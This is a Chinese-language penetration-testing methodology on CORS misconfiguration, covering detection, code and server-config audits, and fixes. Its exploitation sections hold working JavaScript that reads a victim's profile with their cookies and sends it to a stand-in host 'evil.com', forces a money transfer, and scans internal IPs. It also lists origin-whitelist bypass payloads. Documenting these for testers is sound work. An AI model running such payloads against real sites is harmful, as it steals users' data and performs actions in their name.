# CORS 配置错误方法论

---

## 第一部分：文档概述

### 1.1 编写目的
为渗透测试人员提供针对跨域资源共享（CORS）配置错误的检测与利用方法论。CORS 配置错误可能导致敏感数据泄露、未授权 API 访问和跨站请求伪造攻击。

### 1.2 适用范围
- Web 应用程序的 CORS 策略
- RESTful API 的跨域配置
- 微服务架构中的跨域通信
- 前后端分离应用的接口访问

### 1.3 读者对象
- 渗透测试工程师
- Web 安全分析师
- API 安全审计人员
- 前端/后端开发人员

---

## 第二部分：核心渗透技术专题

### 专题：CORS 配置错误攻击

#### 2.1 技术介绍

跨域资源共享（CORS, Cross-Origin Resource Sharing）是一种浏览器安全机制，用于控制 Web 应用在不同域名之间的资源访问。当 CORS 配置不当时，攻击者可以绕过同源策略，窃取敏感数据或执行未授权操作。

**CORS 配置错误的本质：**
服务器返回的 CORS 响应头过于宽松，允许任意或不受信任的域名访问受保护的资源，违背了**最小权限原则**。

**CORS 响应头说明：**

| 响应头 | 作用 | 风险配置 |
|-------|------|---------|
| `Access-Control-Allow-Origin` | 指定允许的源 | `*` 或反射任意源 |
| `Access-Control-Allow-Credentials` | 是否允许携带凭证 | `true` 与 `*` 同时使用 |
| `Access-Control-Allow-Methods` | 允许的 HTTP 方法 | 包含 `DELETE`、`PUT` 等危险方法 |
| `Access-Control-Allow-Headers` | 允许的请求头 | 包含 `Authorization`、`Content-Type` 等 |
| `Access-Control-Max-Age` | 预检请求缓存时间 | 过长可能导致策略更新延迟 |

**风险等级分类：**

| 配置类型 | 风险描述 | 危害等级 |
|---------|---------|---------|
| **ACAO: \*** | 允许任意域名访问 | 中 |
| **ACAO: 反射任意源** | 动态反射 Origin 头 | 高 |
| **ACAO + ACC: true** | 允许跨域携带凭证 | 严重 |
| **通配符子域名** | `*.example.com` 配置错误 | 高 |
| **Null 源允许** | 允许 `null` 源访问 | 高 |

#### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **前后端分离应用** | React/Vue + API | CORS 配置过于宽松 |
| **移动应用后端** | App API 接口 | 未限制请求来源 |
| **第三方集成** | 开放 API 给合作伙伴 | 白名单配置错误 |
| **微服务架构** | 服务间跨域调用 | 内部服务 CORS 配置错误 |
| **单点登录** | SSO 认证接口 | 认证信息可被跨域窃取 |
| **用户数据接口** | 个人信息、订单查询 | 敏感数据可被跨域读取 |

#### 2.3 漏洞探测方法

##### 2.3.1 黑盒测试

**1. 基础 CORS 检测**

```bash
# 发送带 Origin 头的请求
curl -H "Origin: https://evil.com" \
     -v http://target/api/user/info

# 检查响应头
Access-Control-Allow-Origin: https://evil.com  # ❌ 危险
Access-Control-Allow-Credentials: true         # ❌ 危险
```

**2. 测试矩阵**

| 测试用例 | Origin 头 | 预期安全响应 | 危险响应 |
|---------|----------|-------------|---------|
| **任意源测试** | `https://evil.com` | 无 ACAO 或拒绝 | `*` 或反射 |
| **Null 源测试** | `null` | 无 ACAO | 反射 null |
| **子域名测试** | `https://sub.evil.com` | 无 ACAO | 允许 |
| **通配符测试** | `https://example.com.evil.com` | 无 ACAO | 允许 |
| **协议变异** | `http://target.com` (目标为 HTTPS) | 无 ACAO | 允许 |
| **大小写测试** | `https://Evil.Com` | 无 ACAO | 允许 |

**3. 自动化检测脚本**

```python
import requests

target = "http://target/api/endpoint"
origins = [
    "https://evil.com",
    "null",
    "https://target.com.evil.com",
    "http://target.com",
]

for origin in origins:
    headers = {"Origin": origin}
    response = requests.get(target, headers=headers)
    
    acao = response.headers.get("Access-Control-Allow-Origin")
    acc = response.headers.get("Access-Control-Allow-Credentials")
    
    print(f"Origin: {origin}")
    print(f"  ACAO: {acao}")
    print(f"  ACC: {acc}")
    
    if acao == "*" and acc == "true":
        print("  ⚠️ 危险：* 与 credentials 同时使用")
    elif acao == origin:
        print("  ⚠️ 警告：Origin 被反射")
```

##### 2.3.2 白盒测试

**1. 后端代码审计**

```java
// ❌ 不安全：允许任意源
@Configuration
public class CorsConfig {
    @Bean
    public CorsFilter corsFilter() {
        CorsConfiguration config = new CorsConfiguration();
        config.addAllowedOrigin("*");  // 危险
        config.setAllowCredentials(true);  // 危险组合
        // ...
    }
}

// ✅ 安全：明确指定允许的源
config.addAllowedOrigin("https://trusted.com");
```

```python
# ❌ 不安全：Flask-CORS 配置
from flask_cors import CORS
CORS(app, origins="*")  # 危险

# ✅ 安全
CORS(app, origins=["https://trusted.com"])
```

```javascript
// ❌ 不安全：Node.js Express
app.use(cors({
    origin: '*',  // 危险
    credentials: true  // 危险组合
}));

// ✅ 安全
app.use(cors({
    origin: ['https://trusted.com'],
    credentials: true
}));
```

**2. 服务器配置检查**

```apache
# ❌ 不安全：Apache 配置
Header set Access-Control-Allow-Origin "*"
Header set Access-Control-Allow-Credentials "true"

# ✅ 安全
Header set Access-Control-Allow-Origin "https://trusted.com"
```

```nginx
# ❌ 不安全：Nginx 配置
add_header Access-Control-Allow-Origin *;
add_header Access-Control-Allow-Credentials true;

# ✅ 安全
add_header Access-Control-Allow-Origin "https://trusted.com";
```

#### 2.4 漏洞利用方法

##### 2.4.1 敏感数据窃取

**1. 利用 CORS 配置错误窃取用户数据**

```html
<!-- 攻击者网站：https://evil.com -->
<script>
async function stealData() {
    const response = await fetch('https://target.com/api/user/profile', {
        method: 'GET',
        credentials: 'include',  // 携带受害者 Cookie
        mode: 'cors'
    });
    
    const data = await response.json();
    
    // 将数据发送到攻击者服务器
    fetch('https://evil.com/steal?data=' + encodeURIComponent(JSON.stringify(data)));
}

stealData();
</script>
```

**2. 利用场景**
```
1. 受害者访问攻击者网站
2. 浏览器执行恶意 JavaScript
3. 请求目标 API 并携带 Cookie
4. CORS 允许跨域读取响应
5. 敏感数据被发送到攻击者服务器
```

##### 2.4.2 未授权操作执行

```html
<script>
async function performAction() {
    // 执行转账操作
    await fetch('https://target.com/api/transfer', {
        method: 'POST',
        credentials: 'include',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            to: 'attacker_account',
            amount: 10000
        })
    });
}

performAction();
</script>
```

##### 2.4.3 内部网络探测

```html
<script>
async function probeInternal(ip) {
    try {
        const response = await fetch(`http://${ip}:8080/admin`, {
            mode: 'cors',
            credentials: 'include'
        });
        
        if (response.status === 200) {
            console.log(`Found: ${ip}`);
            // 发送到攻击者服务器
            fetch(`https://evil.com/found?ip=${ip}`);
        }
    } catch (e) {
        console.log(`Not found: ${ip}`);
    }
}

// 扫描内网 IP
for (let i = 1; i < 255; i++) {
    probeInternal(`192.168.1.${i}`);
}
</script>
```

#### 2.5 漏洞利用绕过方法

##### 2.5.1 绕过 Origin 白名单

| 绕过技术 | Payload 示例 | 说明 |
|---------|-------------|------|
| **子域名注入** | `https://target.com.evil.com` | 利用字符串匹配 |
| **协议变异** | `http://target.com` (目标 HTTPS) | 协议检查缺失 |
| **大小写绕过** | `https://Target.Com` | 大小写不敏感 |
| **前置/后置点** | `https://evil.com.target.com` | 后缀检查缺失 |
| **Unicode 混淆** | `https://target。com` | 字符编码问题 |

##### 2.5.2 Null 源绕过

```html
<!-- 利用 sandbox iframe 产生 null 源 -->
<iframe sandbox="allow-scripts" src="https://evil.com/cors-attack.html"></iframe>

<!-- 在 attack.html 中 -->
<script>
// Origin 头为 null
fetch('https://target.com/api/data', {
    credentials: 'include'
});
</script>
```

##### 2.5.3 通配符绕过

```
如果目标配置：*.target.com

测试：
- https://sub.target.com.evil.com  (后缀添加)
- https://evil.com/target.com      (前缀添加)
- https://targetXcom.evil.com      (字符替换)
```

---

## 第三部分：附录

### 3.1 CORS 安全配置速查

| 配置项 | 安全做法 | 危险做法 |
|-------|---------|---------|
| **Allow-Origin** | 明确指定可信域名 | `*` 或动态反射 |
| **Allow-Credentials** | 与具体域名配合使用 | 与 `*` 同时使用 |
| **Allow-Methods** | 仅允许必要方法 | 允许所有方法 |
| **Allow-Headers** | 仅允许必要请求头 | 允许所有请求头 |
| **Max-Age** | 合理缓存时间（如 24 小时） | 过长或过短 |

### 3.2 检测工具

| 工具名称 | 用途 | 命令示例 |
|---------|------|---------|
| **Burp Suite** | CORS 检测 | Scanner 模块 |
| **Corsy** | CORS 漏洞扫描 | `python corsy.py -u target` |
| **CORS-Scan** | 自动化检测 | Burp 插件 |
| **Postman** | 手动测试 | 自定义 Origin 头 |

### 3.3 修复建议

- [ ] 明确指定允许的可信域名列表
- [ ] 不要使用 `*` 与 `credentials: true` 组合
- [ ] 不要动态反射 Origin 头
- [ ] 限制允许的 HTTP 方法
- [ ] 实施适当的请求头验证
- [ ] 使用 CSRF Token 进行额外保护
- [ ] 定期审计 CORS 配置
